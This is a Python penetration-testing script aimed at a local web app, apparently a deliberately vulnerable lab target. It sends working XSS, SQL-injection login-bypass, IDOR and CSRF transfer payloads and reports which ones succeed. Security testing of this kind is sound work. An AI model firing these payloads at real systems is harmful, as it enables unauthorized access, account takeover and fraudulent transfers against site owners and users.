import requests
from bs4 import BeautifulSoup
import sys

BASE_URL = 'http://localhost:5000'

def test_xss():
    """Test for XSS vulnerability"""
    print("Testing XSS vulnerability...")

    # Login first
    session = requests.Session()
    login_data = {'username': 'user1', 'password': 'pass1'}
    response = session.post(f'{BASE_URL}/login', data=login_data)

    if 'dashboard' not in response.url:
        print("❌ Login failed")
        return

    # Post XSS payload
    xss_payload = '<script>alert("XSS!")</script>'
    post_data = {'content': xss_payload}
    response = session.post(f'{BASE_URL}/post', data=post_data)

    # Check if XSS payload is reflected
    response = session.get(f'{BASE_URL}/dashboard')
    if xss_payload in response.text:
        print("✅ XSS vulnerability found - payload reflected in dashboard")
    else:
        print("❌ No XSS vulnerability detected")

def test_sqli():
    """Test for SQL Injection vulnerability"""
    print("\nTesting SQL Injection vulnerability...")

    # Test login bypass
    sqli_payload = "' OR '1'='1' --"
    login_data = {'username': sqli_payload, 'password': 'anything'}
    response = requests.post(f'{BASE_URL}/login', data=login_data)

    if 'dashboard' in response.url:
        print("✅ SQL Injection vulnerability found - login bypass successful")
    else:
        print("❌ No SQL Injection vulnerability detected")

def test_idor():
    """Test for IDOR vulnerability"""
    print("\nTesting IDOR vulnerability...")

    # Login as user1
    session = requests.Session()
    login_data = {'username': 'user1', 'password': 'pass1'}
    response = session.post(f'{BASE_URL}/login', data=login_data)

    if 'dashboard' not in response.url:
        print("❌ Login failed")
        return

    # Try to access another user's posts
    response = session.get(f'{BASE_URL}/dashboard?user_id=1')  # Admin posts

    if 'admin' in response.text.lower():
        print("✅ IDOR vulnerability found - can access other users' data")
    else:
        print("❌ No IDOR vulnerability detected")

def test_csrf():
    """Test for CSRF vulnerability"""
    print("\nTesting CSRF vulnerability...")

    # Create a malicious form
    csrf_html = f'''
    <html>
    <body>
    <form action="{BASE_URL}/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_user" value="999">
    </form>
    <script>document.forms[0].submit();</script>
    </body>
    </html>
    '''

    # In a real scenario, this would be hosted on an attacker site
    # For demo purposes, we'll simulate the POST request directly
    session = requests.Session()

    # Login first
    login_data = {'username': 'user1', 'password': 'pass1'}
    response = session.post(f'{BASE_URL}/login', data=login_data)

    if 'dashboard' not in response.url:
        print("❌ Login failed")
        return

    # Attempt CSRF attack (no token needed)
    csrf_data = {'amount': '1000', 'to_user': '999'}
    response = session.post(f'{BASE_URL}/transfer', data=csrf_data)

    if 'Transferred' in response.text:
        print("✅ CSRF vulnerability found - transfer successful without token")
    else:
        print("❌ No CSRF vulnerability detected")

if __name__ == '__main__':
    print("Web Penetration Testing Script")
    print("=" * 40)

    try:
        test_xss()
        test_sqli()
        test_idor()
        test_csrf()

        print("\n" + "=" * 40)
        print("Penetration testing completed!")

    except Exception as e:
        print(f"Error during testing: {e}")
        sys.exit(1)